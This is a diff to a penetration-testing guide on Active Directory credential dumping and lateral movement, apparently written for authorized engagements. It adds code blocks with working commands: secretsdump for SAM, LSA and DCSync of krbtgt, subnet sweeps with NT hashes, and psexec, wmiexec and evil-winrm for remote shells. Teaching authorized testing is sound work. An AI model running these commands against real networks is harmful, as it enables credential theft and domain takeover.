@@ -8,7 +8,15 @@ Once you have credentials or admin on one host, credential access harvests more 
 - **SAM + SYSTEM (local accounts)** — `reg save` the hives or `secretsdump.py -sam ...`; gives local account NT hashes (useful for password reuse across hosts).
 - **DPAPI** — decrypts saved browser/RDP/Wi-Fi creds with the user's master key.
 - **NTDS.dit (the whole directory)** — on a DC, every domain hash. Pull via `secretsdump.py`, ntdsutil `IFM`, or VSS snapshot. This is domain compromise — report it.
-- **DCSync** — ask a DC to replicate a specific account's hash using `Replicating Directory Changes` rights: `secretsdump.py <domain>/<user>:<pass>@<dc> -just-dc-user krbtgt`. No code on the DC needed.
+- **DCSync** — ask a DC to replicate an account's hash using `Replicating Directory Changes` rights; no code on the DC needed.
+
+```bash
+# Dump local SAM + LSA secrets from a host
+secretsdump.py <domain>/<user>:<pass>@<target>
+
+# DCSync a single account (e.g. krbtgt) from a DC
+secretsdump.py <domain>/<user>:<pass>@<dc> -just-dc-user krbtgt
+```
 
 ## The two reuse primitives
 
@@ -27,7 +35,17 @@ Both mean cracking is optional — a dumped hash or ticket is often enough to mo
 | DCOM / scheduled tasks | `atexec.py` | Fallbacks when others are blocked |
 | RDP | `xfreerdp`, restricted admin mode | Interactive; PtH works with restricted admin |
 
-- **Sweep with creds:** `nxc smb <subnet> -u <user> -H <hash>` (or `-p <pass>`) shows where you have access and where you are local admin — pick the next hop from that.
+```bash
+# Sweep a subnet with a password or an NT hash (pass-the-hash)
+nxc smb <subnet> -u <user> -p <pass>
+nxc smb <subnet> -u <user> -H <nt-hash>
+
+# Get a shell on a host you are admin on (use -hashes for PtH)
+psexec.py <domain>/<user>@<target>          # or -hashes :<nt-hash>
+wmiexec.py <domain>/<user>@<target>         # quieter, no service
+evil-winrm -i <target> -u <user> -p <pass>  # if WinRM (5985) is open
+```
+
 - **Overpass-the-hash:** turn an NT hash into a real Kerberos TGT (Rubeus `asktgt`) to move via Kerberos instead of NTLM.
 
 ## Method (keep it disciplined on an engagement)
